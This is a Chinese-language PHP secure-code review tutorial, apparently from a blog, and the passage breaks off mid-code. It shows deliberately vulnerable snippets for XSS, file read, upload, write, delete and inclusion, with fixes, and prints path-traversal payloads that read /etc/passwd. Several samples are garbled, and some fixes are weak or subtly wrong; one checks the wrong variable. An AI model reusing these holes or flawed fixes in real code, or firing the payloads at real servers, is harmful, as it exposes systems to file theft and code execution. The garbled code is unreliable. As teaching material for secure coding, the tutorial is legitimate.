<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">img = <span class="keyword">isset</span>(GET[<span class="string">'img'</span>]) ? htmlspecialchars($GET[<span class="string">'img'</span>]) : <span class="string">'default.jpg'</span>;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">&lt;img src = <span class="string">""</span>id = <span class="string">"image"</span> &gt;</span><br><span class="line"></span><br><span class="line">&lt;script &gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test = document.getElementById(<span class="string">'image'</span>);</span><br><span class="line"></span><br><span class="line">test.src = <span class="string">'&lt;?php echo $img;?&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&lt; /script&gt;/</span><br></pre></td></tr></table></figure>
<p>使用了htmlspecialchars进行过滤，但单引号没有过滤，导致DOMXSS<br>修复建议：<br>在接收输入后进行htmlspecialchars过滤，并且还有对单引号和反斜杠进行转义<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img = <span class="keyword">isset</span>(GET[<span class="string">'img'</span>]) ? htmlspecialchars(addslashes($GET[<span class="string">'img'</span>])) : <span class="string">'default.jpg'</span>;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">content = <span class="keyword">isset</span>(GET[<span class="string">'content'</span>]) ? htmlspecialchars($GET[<span class="string">'content'</span>]) : <span class="string">'无内容'</span>;</span><br><span class="line"></span><br><span class="line">content = str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, content);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">&lt;div id = <span class="string">"content"</span> &gt;</span><br></pre></td></tr></table></figure>
<p>这是测试内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; /div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test = document.getElementById(<span class="string">'content'</span>);</span><br><span class="line"></span><br><span class="line">test.innerHTML = <span class="string">'&lt;?php echo $content;?&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&lt;/script &gt;</span><br></pre></td></tr></table></figure>
<p>innerHTML、documen.write这种直接修改html内容的方法，应对其内容进行严格过滤，否则通过8进制或16进制编码可绕过htmlspecialchars过滤<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) ? htmlspecialchars(addslashes($_GET[<span class="string">'content'</span>])) : <span class="string">'无内容'</span>;</span><br></pre></td></tr></table></figure>
<h2 id="1-文件漏洞"><a href="#1-文件漏洞" class="headerlink" title="1.文件漏洞"></a>1.文件漏洞</h2><h3 id="2-1文件读取漏洞"><a href="#2-1文件读取漏洞" class="headerlink" title="2.1文件读取漏洞"></a>2.1文件读取漏洞</h3><h4 id="0x01漏洞背景-3"><a href="#0x01漏洞背景-3" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>
<h4 id="0x02漏洞代码及分析-3"><a href="#0x02漏洞代码及分析-3" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">template = <span class="keyword">isset</span>(GET[<span class="string">'template'</span>]) ? $GET[<span class="string">'template'</span>] : <span class="string">'index.html'</span>;</span><br><span class="line">file = file_get_contents(<span class="string">'2.1/'</span>.template);</span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对../进行过滤，导致可以跨目录读取文件。未对后缀名进行限制，导致可以读取php文件内容。<br>修复建议：</p>
<ul>
<li><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?template=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>不允许..等跨目录字符出现，使用addslashes防止%00截断，且限制后缀白名单<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">template = <span class="keyword">isset</span>(GET[<span class="string">'template'</span>]) ? addslashes($GET[<span class="string">'template'</span>]) : <span class="string">'index.html'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr(template, <span class="string">'..'</span>) || substr(template, <span class="number">-5</span>, <span class="number">5</span>) != <span class="string">'.html'</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">    action = <span class="keyword">isset</span>(GET[<span class="string">'action'</span>]) ? $GET[<span class="string">'action'</span>] : <span class="string">'login'</span>;</span><br><span class="line"></span><br><span class="line">    fp = <span class="string">"./2.1/"</span>.action.<span class="string">"/index.html"</span>;</span><br><span class="line"></span><br><span class="line">    f = fopen(fp, <span class="string">'r'</span>);</span><br><span class="line"></span><br><span class="line">    strout = fread(f, filesize($fp));</span><br><span class="line"></span><br><span class="line">    fclose($f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $strout;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对../进行过滤，导致可以跨目录读取文件。未过滤%00字节，在&lt;PHP5.3.4版本中，可在截断后自定义路径和文件名</p>
<ul>
<li><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
</li>
<li><p>修复建议：</p>
</li>
</ul>
<p>不允许..等跨目录字符出现，使用addslashes防止%00截断<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">action = <span class="keyword">isset</span>(GET[<span class="string">'action'</span>]) ? addslashes($GET[<span class="string">'action'</span>]) : <span class="string">'login'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr($template, <span class="string">'..'</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-2文件上传漏洞"><a href="#2-2文件上传漏洞" class="headerlink" title="2.2文件上传漏洞"></a>2.2文件上传漏洞</h3><h4 id="0x01漏洞背景-4"><a href="#0x01漏洞背景-4" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span> || FILES <span class="string">"file"</span> == <span class="string">"image/jpeg"</span> || $FILES <span class="string">"file"</span> == <span class="string">"image/pjpeg"</span>) &amp;&amp; $_FILES</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_FILES <span class="string">"file"</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Return Code: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Upload: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Type: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Size: "</span>.$_FILES <span class="string">"file"</span> / <span class="number">1024.</span><span class="string">" Kb&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Temp file: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"2.2/upload/"</span>.$_FILES <span class="string">"file"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> $_FILES <span class="string">"file"</span>.<span class="string">" already exists. "</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            move_uploaded_file(_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"2.2/upload/"</span>._FILES <span class="string">"file"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Stored in: "</span>.<span class="string">"2.2/upload/"</span>.$_FILES <span class="string">"file"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>仅对<strong>Content-type</strong>验证，因为Content-type可以伪造导致可以绕过限制图片验证，导致任意文件上传<br>修复建议：<br>对后缀进行校验，采用白名单模式。保存文件名采用随机文件名+后缀的方式保存<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ext = substr(FILES <span class="string">"file"</span>, strrpos($FILES <span class="string">"file"</span>, <span class="string">'.'</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    filename = time().rand(<span class="number">100</span>, <span class="number">999</span>).<span class="string">'.'</span>.ext;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ext == <span class="string">"jpg"</span> || ext == <span class="string">"jpeg"</span> || ext == <span class="string">"png"</span>) &amp;&amp; _FILES <span class="string">"file"</span> &lt; <span class="number">20000</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_FILES <span class="string">"file"</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Return Code: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Type: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Size: "</span>.$_FILES <span class="string">"file"</span> / <span class="number">1024.</span><span class="string">" Kb&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Temp file: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="string">"2.2/upload/"</span>.$filename)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> $filename.<span class="string">" already exists. "</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                move_uploaded_file(_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"2.2/upload/"</span>.filename);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Stored in: "</span>.<span class="string">"2.2/upload/"</span>.$filename;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">imageinfo = getimagesize(_FILES <span class="string">'userfile'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/gif'</span> &amp;&amp; imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, we only accept GIF and JPEG images\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uploaddir = <span class="string">'2.2/upload/'</span>;</span><br><span class="line"></span><br><span class="line">uploadfile = uploaddir.basename($_FILES <span class="string">'userfile'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], uploadfile)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>仅通过读取文件头判断文件类型，可被绕过；后缀名未进行校验，导致任意文件上传、<br>修复建议：<br>参考漏洞代码1的修复方式<br>漏洞代码3</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$blacklist = <span class="keyword">array</span>(<span class="string">".php"</span>, <span class="string">".phtml"</span>, <span class="string">".php3"</span>, <span class="string">".php4"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(blacklist <span class="keyword">as</span> item) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/&#123;item&#125;\$/i"</span>, _FILES <span class="string">'userfile'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"We do not allow uploading PHP files\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uploaddir = <span class="string">'2.2/upload/'</span>;</span><br><span class="line"></span><br><span class="line">uploadfile = uploaddir.basename($_FILES <span class="string">'userfile'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], uploadfile)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>扩展名黑名单过滤不严，可上传.php5文件进行绕过。导致任意文件上传<br>修复建议：<br>参考漏洞代码1的修复方式</p>
<p>2.3文件写入漏洞<br>0x01漏洞背景<br>在生成配置文件或者缓存文件的时候，未对传入的内容进行过滤，导致php代码执行漏洞<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(_POST[<span class="string">'debug'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    setting = _POST[<span class="string">'debug'</span>];</span><br><span class="line"></span><br><span class="line">    $content = <span class="string">"&lt;?php\r\n"</span>;</span><br><span class="line"></span><br><span class="line">    content. = <span class="string">"\$YCF['debug'] = '"</span>.setting.<span class="string">"';\r\n"</span>;</span><br><span class="line">    $content. = <span class="string">"?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">"2.3/config.php"</span>, $content);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对传入内容进行任何过滤，用单引号绕出去可以引起代码执行漏洞<br>修复建议：<br>进行addslashes函数过滤。且不要拼接在双引号内，否则同样会引起代码执行漏洞<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$setting = addslashes($_POST[<span class="string">'debug'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="2-4文件删除漏洞"><a href="#2-4文件删除漏洞" class="headerlink" title="2.4文件删除漏洞"></a>2.4文件删除漏洞</h3><h4 id="0x01漏洞背景-5"><a href="#0x01漏洞背景-5" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>删除文件时对路径或文件名过滤不严，会导致任意文件删除</p>
<h4 id="0x02漏洞代码及分析-4"><a href="#0x02漏洞代码及分析-4" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'action'</span>] == <span class="string">'del'</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        img = _GET[<span class="string">'img'</span>];</span><br><span class="line"></span><br><span class="line">        unlink(<span class="string">'2.4/'</span>.$img);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'删除图片成功'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>对删除文件过滤不严，导致任意文件删除。<br>修复建议：<br>不允许..等跨目录字符出现。进行addslashes函数过滤<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">img = addslashes(_GET[<span class="string">'img'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strstr($img, <span class="string">'..'</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-1文件包含漏洞"><a href="#3-1文件包含漏洞" class="headerlink" title="3.1文件包含漏洞"></a>3.1文件包含漏洞</h3><h4 id="0x01漏洞背景-6"><a href="#0x01漏洞背景-6" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。通常是由于include、require引起恶意包含<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'func'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">'func'</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'3.1/default.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>在未过滤的情况下，可包含带有恶意代码的JPG文件、日志文件，甚至可以远程包含<br>修复建议：<br>不允许..等跨目录字符出现，对前缀跟后缀都进行限制，使用addslashes过滤%00防止被截断包含<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'func'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    file = addslashes(_GET[<span class="string">'func'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strstr($file, <span class="string">'..'</span>))</span><br><span 